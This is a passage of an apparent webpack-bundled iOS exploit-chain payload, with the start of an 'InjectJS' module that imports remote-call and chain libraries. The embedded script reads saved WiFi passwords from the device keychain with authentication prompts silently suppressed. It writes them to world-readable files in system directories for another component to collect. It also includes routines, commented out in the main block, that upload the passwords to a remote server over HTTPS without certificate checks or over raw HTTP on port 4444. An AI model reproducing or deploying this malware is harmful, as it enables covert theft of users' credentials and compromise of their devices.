content\n\t\tlet content = \"=== WiFi Passwords ===\\n\";\n\t\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\t\tcontent += \"Device: \" + deviceUUID + \"\\n\";\n\t\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\t\n\t\tfor (const p of passwords) {\n\t\t\tcontent += \"SSID Hash: \" + p.ssid + \"\\n\";\n\t\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\t\tcontent += \"---\\n\";\n\t\t}\n\t\t\n\t\t// Base64 encode\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\tconst base64Data = base64Encode(contentBytes);\n\t\t\n\t\t// Build JSON payload (same format as file_downloader.js)\n\t\tconst jsonPayload = JSON.stringify({\n\t\t\tpath: \"/private/var/tmp/wifi_passwords.txt\",\n\t\t\tcategory: \"credentials\",\n\t\t\tdescription: \"WiFi Passwords\",\n\t\t\tsize: content.length,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Build HTTP request\n\t\tconst httpRequest = \n\t\t\t\"POST /upload HTTP/1.1\\r\\n\" +\n\t\t\t\"Host: \" + SERVER_HOST + \":\" + SERVER_PORT + \"\\r\\n\" +\n\t\t\t\"Content-Type: application/json\\r\\n\" +\n\t\t\t\"Content-Length: \" + jsonPayload.length + \"\\r\\n\" +\n\t\t\t\"Connection: close\\r\\n\" +\n\t\t\t\"\\r\\n\" +\n\t\t\tjsonPayload;\n\t\t\n\t\t// Load CoreFoundation for streams\n\t\tNative.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\t\tNative.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CFNetwork.framework/CFNetwork\", 1);\n\t\t\n\t\t// Create CFString for host\n\t\tconst hostCFStr = createCFString(SERVER_HOST);\n\t\tif (!hostCFStr || hostCFStr === 0n) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Create stream pair\n\t\tconst readStreamPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tconst writeStreamPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tNative.write64(readStreamPtr, 0n);\n\t\tNative.write64(writeStreamPtr, 0n);\n\t\t\n\t\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCFStr, SERVER_PORT, readStreamPtr, writeStreamPtr);\n\t\t\n\t\tconst writeStream = Native.readPtr(writeStreamPtr);\n\t\tconst readStream = Native.readPtr(readStreamPtr);\n\t\t\n\t\tNative.callSymbol(\"free\", readStreamPtr);\n\t\tNative.callSymbol(\"free\", writeStreamPtr);\n\t\tNative.callSymbol(\"CFRelease\", hostCFStr);\n\t\t\n\t\tif (!writeStream || writeStream === 0n) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (USE_HTTPS) {\n\t\t\t// Enable TLS\n\t\t\tconst kCFStreamPropertySSLSettings = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamPropertySSLSettings\");\n\t\t\tconst kCFStreamSSLLevel = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSSLLevel\");\n\t\t\tconst kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\t\t\tconst kCFStreamSSLValidatesCertificateChain = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSSLValidatesCertificateChain\");\n\t\t\t\n\t\t\tif (kCFStreamPropertySSLSettings && kCFStreamPropertySSLSettings !== 0n) {\n\t\t\t\tconst sslSettings = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 2, \n\t\t\t\t\tNative.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\"),\n\t\t\t\t\tNative.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\"));\n\t\t\t\t\n\t\t\t\tif (sslSettings && sslSettings !== 0n) {\n\t\t\t\t\t// Disable cert validation for self-signed\n\t\t\t\t\tconst kCFBooleanFalse = Native.readPtr(Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanFalse\"));\n\t\t\t\t\tif (kCFStreamSSLValidatesCertificateChain && kCFBooleanFalse) {\n\t\t\t\t\t\tNative.callSymbol(\"CFDictionarySetValue\", sslSettings, \n\t\t\t\t\t\t\tNative.readPtr(kCFStreamSSLValidatesCertificateChain), kCFBooleanFalse);\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, \n\t\t\t\t\t\tNative.readPtr(kCFStreamPropertySSLSettings), sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, \n\t\t\t\t\t\tNative.readPtr(kCFStreamPropertySSLSettings), sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", sslSettings);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t// Set security level\n\t\t\tif (kCFStreamSSLLevel && kCFStreamSocketSecurityLevelNegotiatedSSL) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream,\n\t\t\t\t\tNative.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream,\n\t\t\t\t\tNative.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Open streams\n\t\tconst writeOpen = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n\t\tconst readOpen = Native.callSymbol(\"CFReadStreamOpen\", readStream);\n\t\t\n\t\tif (!writeOpen || !readOpen) {\n\t\t\tif (writeStream) Native.callSymbol(\"CFRelease\", writeStream);\n\t\t\tif (readStream) Native.callSymbol(\"CFRelease\", readStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Wait for connection\n\t\tlet attempts = 0;\n\t\twhile (attempts < 50) {\n\t\t\tconst canWrite = Native.callSymbol(\"CFWriteStreamCanAcceptBytes\", writeStream);\n\t\t\tif (canWrite) break;\n\t\t\tNative.callSymbol(\"usleep\", 100000); // 100ms\n\t\t\tattempts++;\n\t\t}\n\t\t\n\t\tif (attempts >= 50) {\n\t\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Send data\n\t\tconst requestBytes = Native.stringToBytes(httpRequest, false);\n\t\tconst dataPtr = Native.callSymbol(\"malloc\", BigInt(requestBytes.byteLength));\n\t\tNative.write(dataPtr, requestBytes);\n\t\t\n\t\tlet totalSent = 0;\n\t\tconst totalLen = requestBytes.byteLength;\n\t\t\n\t\twhile (totalSent < totalLen) {\n\t\t\tconst canWrite = Native.callSymbol(\"CFWriteStreamCanAcceptBytes\", writeStream);\n\t\t\tif (!canWrite) {\n\t\t\t\tNative.callSymbol(\"usleep\", 10000);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tconst remaining = totalLen - totalSent;\n\t\t\tconst chunkSize = remaining > 4096 ? 4096 : remaining;\n\t\t\tconst written = Native.callSymbol(\"CFWriteStreamWrite\", writeStream, \n\t\t\t\tdataPtr + BigInt(totalSent), BigInt(chunkSize));\n\t\t\t\n\t\t\tif (Number(written) <= 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\ttotalSent += Number(written);\n\t\t}\n\t\t\n\t\tNative.callSymbol(\"free\", dataPtr);\n\t\t\n\t\t// Wait briefly for response\n\t\tNative.callSymbol(\"usleep\", 500000); // 500ms\n\t\t\n\t\t// Cleanup\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\n\t\treturn totalSent === totalLen;\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\n// Raw socket HTTP (no TLS) - might bypass CFStream sandbox restrictions\nfunction sendWiFiPasswordsViaHTTP(passwords) {\n\t\n\ttry {\n\t\tconst deviceUUID = getDeviceUUID();\n\t\t\n\t\t// Build content\n\t\tlet content = \"=== WiFi Passwords ===\\n\";\n\t\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\t\tcontent += \"Device: \" + deviceUUID + \"\\n\";\n\t\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\t\n\t\tfor (const p of passwords) {\n\t\t\tcontent += \"SSID Hash: \" + p.ssid + \"\\n\";\n\t\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\t\tcontent += \"---\\n\";\n\t\t}\n\t\t\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\tconst base64Data = base64Encode(contentBytes);\n\t\t\n\t\tconst jsonPayload = JSON.stringify({\n\t\t\tpath: \"/private/var/tmp/wifi_passwords.txt\",\n\t\t\tcategory: \"credentials\",\n\t\t\tdescription: \"WiFi Passwords\",\n\t\t\tsize: content.length,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Create socket\n\t\tconst AF_INET = 2;\n\t\tconst SOCK_STREAM = 1;\n\t\tconst socket = Native.callSymbol(\"socket\", AF_INET, SOCK_STREAM, 0);\n\t\t\n\t\tif (Number(socket) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Build sockaddr_in (use port 4444 for HTTP - matches server)\n\t\tconst HTTP_PORT = 4444;\n\t\tconst addr = Native.callSymbol(\"malloc\", 16);\n\t\tconst addrBuf = new ArrayBuffer(16);\n\t\tconst addrView = new DataView(addrBuf);\n\t\taddrView.setUint8(0, 16);  // sin_len\n\t\taddrView.setUint8(1, AF_INET);  // sin_family\n\t\taddrView.setUint16(2, Native.callSymbol(\"htons\", HTTP_PORT), false);  // sin_port\n\t\t\n\t\t// Parse IP address\n\t\tconst ipParts = SERVER_HOST.split('.');\n\t\taddrView.setUint8(4, parseInt(ipParts[0]));\n\t\taddrView.setUint8(5, parseInt(ipParts[1]));\n\t\taddrView.setUint8(6, parseInt(ipParts[2]));\n\t\taddrView.setUint8(7, parseInt(ipParts[3]));\n\t\t\n\t\tNative.write(addr, addrBuf);\n\t\t\n\t\t// Connect\n\t\tconst connectResult = Native.callSymbol(\"connect\", socket, addr, 16);\n\t\tNative.callSymbol(\"free\", addr);\n\t\t\n\t\tif (Number(connectResult) < 0) {\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Build HTTP request\n\t\tconst httpRequest = \n\t\t\t\"POST /upload HTTP/1.1\\r\\n\" +\n\t\t\t\"Host: \" + SERVER_HOST + \":\" + HTTP_PORT + \"\\r\\n\" +\n\t\t\t\"Content-Type: application/json\\r\\n\" +\n\t\t\t\"Content-Length: \" + jsonPayload.length + \"\\r\\n\" +\n\t\t\t\"Connection: close\\r\\n\" +\n\t\t\t\"\\r\\n\" +\n\t\t\tjsonPayload;\n\t\t\n\t\t// Send\n\t\tconst requestBytes = Native.stringToBytes(httpRequest, false);\n\t\tconst dataPtr = Native.callSymbol(\"malloc\", BigInt(requestBytes.byteLength));\n\t\tNative.write(dataPtr, requestBytes);\n\t\t\n\t\tconst sent = Native.callSymbol(\"send\", socket, dataPtr, BigInt(requestBytes.byteLength), 0);\n\t\tNative.callSymbol(\"free\", dataPtr);\n\t\tNative.callSymbol(\"close\", socket);\n\t\t\n\t\treturn Number(sent) === requestBytes.byteLength;\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\nfunction base64Encode(arrayBuffer) {\n\tconst bytes = new Uint8Array(arrayBuffer);\n\tconst chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\tlet result = \"\";\n\t\n\tfor (let i = 0; i < bytes.length; i += 3) {\n\t\tconst b1 = bytes[i];\n\t\tconst b2 = i + 1 < bytes.length ? bytes[i + 1] : 0;\n\t\tconst b3 = i + 2 < bytes.length ? bytes[i + 2] : 0;\n\t\t\n\t\tresult += chars[b1 >> 2];\n\t\tresult += chars[((b1 & 3) << 4) | (b2 >> 4)];\n\t\tresult += i + 1 < bytes.length ? chars[((b2 & 15) << 2) | (b3 >> 6)] : \"=\";\n\t\tresult += i + 2 < bytes.length ? chars[b3 & 63] : \"=\";\n\t}\n\t\n\treturn result;\n}\n\n// ============================================================================\n// WiFi Password Extraction\n// ============================================================================\n\nfunction extractWiFiPasswords() {\n\tconst passwords = [];\n\t\n\t\n\t// Create query dictionary\n\tconst keyCallbacks = getCFDictKeyCallbacks();\n\tconst valueCallbacks = getCFDictValueCallbacks();\n\t\n\tlet queryDict;\n\tif (keyCallbacks && valueCallbacks && keyCallbacks !== 0n && valueCallbacks !== 0n) {\n\t\tqueryDict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 0, keyCallbacks, valueCallbacks);\n\t} else {\n\t\tqueryDict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 0, 0n, 0n);\n\t}\n\t\n\tif (!queryDict || queryDict === 0n) {\n\t\treturn passwords;\n\t}\n\t\n\ttry {\n\t\t// Security framework constants\n\t\tconst kSecClass = createCFString(\"class\");\n\t\tconst kSecClassGenericPassword = createCFString(\"genp\");\n\t\tconst kSecReturnAttributes = createCFString(\"r_Attributes\");\n\t\tconst kSecReturnData = createCFString(\"r_Data\");\n\t\tconst kSecMatchLimit = createCFString(\"m_Limit\");\n\t\tconst kSecMatchLimitAll = createCFString(\"m_LimitAll\");\n\t\t\n\t\t// IMPORTANT: Disable authentication UI - silently fail instead of prompting user\n\t\tconst kSecUseAuthenticationUI = createCFString(\"u_AuthUI\");\n\t\tconst kSecUseAuthenticationUIFail = createCFString(\"u_AuthUIF\");\n\t\tconst kSecAttrAccessGroup = createCFString(\"agrp\");\n\t\tconst kCFBooleanTrue = getCFBooleanTrue();\n\t\t\n\t\t// Result keys\n\t\tconst kSecAttrService = createCFString(\"svce\");\n\t\tconst kSecAttrAccount = createCFString(\"acct\");\n\t\tconst kResultDataKey = createCFString(\"v_Data\");\n\t\t\n\t\tif (!kSecClass || !kSecClassGenericPassword || !kCFBooleanTrue) {\n\t\t\treturn passwords;\n\t\t}\n\t\t\n\t\t// Query specifically for AirPort service (WiFi passwords)\n\t\tconst kSecAttrServiceKey = createCFString(\"svce\");\n\t\tconst airportService = createCFString(\"AirPort\");\n\t\t\n\t\t// First, query ALL generic passwords to see what wifid can access\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecClass, kSecClassGenericPassword);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnAttributes, kCFBooleanTrue);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnData, kCFBooleanTrue);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecMatchLimit, kSecMatchLimitAll);\n\t\t\n\t\t// IMPORTANT: Disable authentication UI prompts - silently fail for protected items\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecUseAuthenticationUI, kSecUseAuthenticationUIFail);\n\t\t\n\t\t// Query without AirPort filter first to see total accessible items\n\t\tconst allResultPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tif (allResultPtr && allResultPtr !== 0n) {\n\t\t\tNative.write64(allResultPtr, 0n);\n\t\t\tconst allStatus = Native.callSymbol(\"SecItemCopyMatching\", queryDict, allResultPtr);\n\t\t\tconst allStatusNum = Number(allStatus);\n\t\t\tlet allSigned = allStatusNum > 0x7FFFFFFF ? allStatusNum - 0x100000000 : allStatusNum;\n\t\t\t\n\t\t\tif (allSigned === 0) {\n\t\t\t\tconst allResults = Native.readPtr(allResultPtr);\n\t\t\t\tif (allResults && allResults !== 0n) {\n\t\t\t\t\tconst allCount = Number(Native.callSymbol(\"CFArrayGetCount\", allResults));\n\t\t\t\t\t\n\t\t\t\t\t// Scan all items for WiFi passwords - be very defensive\n\t\t\t\t\t// Skip the ALL query for now - just use AirPort query which works\n\t\t\t\t\t// Skip the ALL query loop - it causes crashes on some items\n\t\t\t\t\t// Just release the results and rely on the AirPort-specific query\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", allResults);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", allResultPtr);\n\t\t}\n\t\t\n\t\t// Now query specifically for AirPort\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecAttrServiceKey, airportService);\n\t\t\n\t\t// Execute query\n\t\tconst resultPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tif (!resultPtr || resultPtr === 0n) {\n\t\t\treturn passwords;\n\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write64(resultPtr, 0n);\n\t\t\t\t\n\t\t\t\tconst status = Native.callSymbol(\"SecItemCopyMatching\", queryDict, resultPtr);\n\t\t\t\tconst statusNum = Number(status);\n\t\t\t\tlet signed = statusNum > 0x7FFFFFFF ? statusNum - 0x100000000 : statusNum;\n\t\t\t\t\n\t\t\t\t\n\t\t\t\tif (signed === 0) {\n\t\t\t\t\tconst results = Native.readPtr(resultPtr);\n\t\t\t\t\tif (results && results !== 0n) {\n\t\t\t\t\t\tconst arrayTypeId = Native.callSymbol(\"CFArrayGetTypeID\");\n\t\t\t\t\t\tconst dictTypeId = Native.callSymbol(\"CFDictionaryGetTypeID\");\n\t\t\t\t\t\tconst typeId = Native.callSymbol(\"CFGetTypeID\", results);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (typeId === arrayTypeId) {\n\t\t\t\t\t\t\tconst count = Number(Native.callSymbol(\"CFArrayGetCount\", results));\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// Log ALL items to debug\n\t\t\t\t\t\t\tfor (let i = 0; i < count; i++) {\n\t\t\t\t\t\t\t\tconst item = Native.callSymbol(\"CFArrayGetValueAtIndex\", results, i);\n\t\t\t\t\t\t\t\tif (!item || item === 0n) {\n\t\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrService);\n\t\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrAccount);\n\t\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kResultDataKey);\n\t\t\t\t\t\t\t\tconst hasData = (dataRef && dataRef !== 0n) ? \"YES\" : \"NO\";\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tfor (let i = 0; i < count; i++) {\n\t\t\t\t\t\t\t\tconst item = Native.callSymbol(\"CFArrayGetValueAtIndex\", results, i);\n\t\t\t\t\t\t\t\tif (!item || item === 0n) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst itemTypeId = Native.callSymbol(\"CFGetTypeID\", item);\n\t\t\t\t\t\t\t\tif (itemTypeId !== dictTypeId) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract service (SSID)\n\t\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrService);\n\t\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract account\n\t\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrAccount);\n\t\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract password (v_Data contains the actual password bytes)\n\t\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kResultDataKey);\n\t\t\t\t\t\t\t\tconst password = cfDataToString(dataRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// All results are AirPort (WiFi) entries since we queried with service=AirPort\n\t\t\t\t\t\t\t\t// The account field contains the SSID\n\t\t\t\t\t\t\t\tif (password && account) {\n\t\t\t\t\t\t\t\t\tpasswords.push({ ssid: account, password: password, service: service });\n\t\t\t\t\t\t\t\t} else if (password) {\n\t\t\t\t\t\t\t\t\t// Fallback: use a placeholder if no account name\n\t\t\t\t\t\t\t\t\tpasswords.push({ ssid: \"(unknown)\", password: password, service: service });\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else if (typeId === dictTypeId) {\n\t\t\t\t\t\t\t// Single result\n\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kSecAttrService);\n\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kSecAttrAccount);\n\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kResultDataKey);\n\t\t\t\t\t\t\tconst password = cfDataToString(dataRef);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (service && password) {\n\t\t\t\t\t\t\t\tconst ssid = account || service;\n\t\t\t\t\t\t\t\tpasswords.push({ ssid: ssid, password: password, service: service });\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", results);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", resultPtr);\n\t\t}\n\t\t\n\t\t// Cleanup CFStrings\n\t\tif (kSecClass) Native.callSymbol(\"CFRelease\", kSecClass);\n\t\tif (kSecClassGenericPassword) Native.callSymbol(\"CFRelease\", kSecClassGenericPassword);\n\t\tif (kSecReturnAttributes) Native.callSymbol(\"CFRelease\", kSecReturnAttributes);\n\t\tif (kSecReturnData) Native.callSymbol(\"CFRelease\", kSecReturnData);\n\t\tif (kSecMatchLimit) Native.callSymbol(\"CFRelease\", kSecMatchLimit);\n\t\tif (kSecMatchLimitAll) Native.callSymbol(\"CFRelease\", kSecMatchLimitAll);\n\t\tif (kSecUseAuthenticationUI) Native.callSymbol(\"CFRelease\", kSecUseAuthenticationUI);\n\t\tif (kSecUseAuthenticationUIFail) Native.callSymbol(\"CFRelease\", kSecUseAuthenticationUIFail);\n\t\tif (kSecAttrService) Native.callSymbol(\"CFRelease\", kSecAttrService);\n\t\tif (kSecAttrAccount) Native.callSymbol(\"CFRelease\", kSecAttrAccount);\n\t\tif (kSecAttrServiceKey) Native.callSymbol(\"CFRelease\", kSecAttrServiceKey);\n\t\tif (airportService) Native.callSymbol(\"CFRelease\", airportService);\n\t\tif (kResultDataKey) Native.callSymbol(\"CFRelease\", kResultDataKey);\n\t\t\n\t} finally {\n\t\tNative.callSymbol(\"CFRelease\", queryDict);\n\t}\n\t\n\treturn passwords;\n}\n\n/**\n * Write passwords to file\n */\nfunction writePasswordsToFile(passwords, outputPath) {\n\t\n\tlet content = \"=== WiFi Passwords ===\\n\";\n\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\n\tfor (const p of passwords) {\n\t\tcontent += \"SSID: \" + p.ssid + \"\\n\";\n\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\tif (p.service) content += \"Service: \" + p.service + \"\\n\";\n\t\tcontent += \"\\n\";\n\t}\n\t\n\tif (passwords.length === 0) {\n\t\tcontent += \"No WiFi passwords found.\\n\";\n\t\tcontent += \"This may be due to:\\n\";\n\t\tcontent += \"  - Process lacks keychain entitlements\\n\";\n\t\tcontent += \"  - No saved WiFi networks\\n\";\n\t\tcontent += \"  - Keychain access denied\\n\";\n\t}\n\t\n\t\n\tconst fd = Native.callSymbol(\"open\", outputPath, 0x601, 511); // O_WRONLY | O_CREAT | O_TRUNC, 0777\n\t\n\tif (Number(fd) < 0) {\n\t\treturn false;\n\t}\n\t\n\ttry {\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\t\n\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(contentBytes.byteLength));\n\t\t\n\t\tif (buf && buf !== 0n) {\n\t\t\tNative.write(buf, contentBytes);\n\t\t\tconst written = Native.callSymbol(\"write\", fd, buf, contentBytes.byteLength);\n\t\t\tNative.callSymbol(\"free\", buf);\n\t\t} else {\n\t\t}\n\t\t\n\t\t// Set 777 permissions\n\t\tNative.callSymbol(\"chmod\", outputPath, 511);\n\t\t\n\t\t// Also create symlink or copy to /tmp\n\t\treturn true;\n\t} finally {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\nNative.init();\n\n\n// Try multiple paths that wifid might have write access to\nconst POSSIBLE_PATHS = [\n\t// wifid's own directories\n\t\"/var/wireless/wifi_passwords.txt\",\n\t\"/var/wireless/Library/wifi_passwords.txt\",\n\t\"/var/wireless/Library/Caches/wifi_passwords.txt\",\n\t\"/var/wireless/Library/Preferences/wifi_passwords.txt\",\n\t\"/private/var/wireless/wifi_passwords.txt\",\n\t\n\t// System temp locations\n\t\"/private/var/tmp/wifi_passwords.txt\",\n\t\"/tmp/wifi_passwords.txt\",\n\t\"/var/tmp/wifi_passwords.txt\",\n\t\n\t// Log directories (often writable by daemons)\n\t\"/var/log/wifi_passwords.txt\",\n\t\"/private/var/log/wifi_passwords.txt\",\n\t\"/var/logs/wifi_passwords.txt\",\n\t\n\t// Root home\n\t\"/var/root/wifi_passwords.txt\",\n\t\"/private/var/root/wifi_passwords.txt\",\n\t\n\t// Mobile directories\n\t\"/var/mobile/wifi_passwords.txt\",\n\t\"/var/mobile/Library/wifi_passwords.txt\",\n\t\"/var/mobile/Library/Caches/wifi_passwords.txt\",\n\t\"/private/var/mobile/Library/Caches/wifi_passwords.txt\",\n\t\n\t// Preferences directories\n\t\"/var/preferences/wifi_passwords.txt\",\n\t\"/private/var/preferences/wifi_passwords.txt\",\n\t\n\t// DB directories\n\t\"/var/db/wifi_passwords.txt\",\n\t\"/private/var/db/wifi_passwords.txt\",\n\t\n\t// Daemon run directories\n\t\"/var/run/wifi_passwords.txt\",\n\t\"/private/var/run/wifi_passwords.txt\",\n\t\n\t// Network-related\n\t\"/var/networkd/wifi_passwords.txt\",\n\t\"/private/var/networkd/wifi_passwords.txt\",\n\t\"/private/var/networkd/db/wifi_passwords.txt\",\n];\n\nlet writablePath = null;\n\nfor (const testPath of POSSIBLE_PATHS) {\n\tconst testFd = Native.callSymbol(\"open\", testPath, 0x601, 511);\n\tif (Number(testFd) >= 0) {\n\t\tNative.callSymbol(\"close\", testFd);\n\t\twritablePath = testPath;\n\t\tbreak;\n\t}\n}\n\ntry {\n\tconst passwords = extractWiFiPasswords();\n\t\n\t// Log passwords to syslog\n\tfor (const p of passwords) {\n\t}\n\t\n\t// ALWAYS write to file first if we have a writable path\n\t// This allows file_downloader (running in SpringBoard) to pick it up\n\tif (passwords.length > 0 && writablePath) {\n\t\twritePasswordsToFile(passwords, writablePath);\n\t}\n\t\n\t// Also try to send via network (usually fails due to sandbox)\n    /*\n\tif (passwords.length > 0) {\n\t\tlet sent = sendWiFiPasswordsViaHTTPS(passwords);\n\t\tif (sent) {\n\t\t} else {\n\t\t\tsent = sendWiFiPasswordsViaHTTP(passwords);\n\t\t\tif (sent) {\n\t\t\t} else {\n\t\t\t}\n\t\t}\n\t}\n    */\n\t\n} catch (e) {\n}\n\n\n\n");

/***/ }),

/***/ "./InjectJS.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return InjectJS; });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/Chain/Chain.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _classPrivateMethodInitSpec(e, a) { _checkPrivateRedeclaration(e, a), a.add(e); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
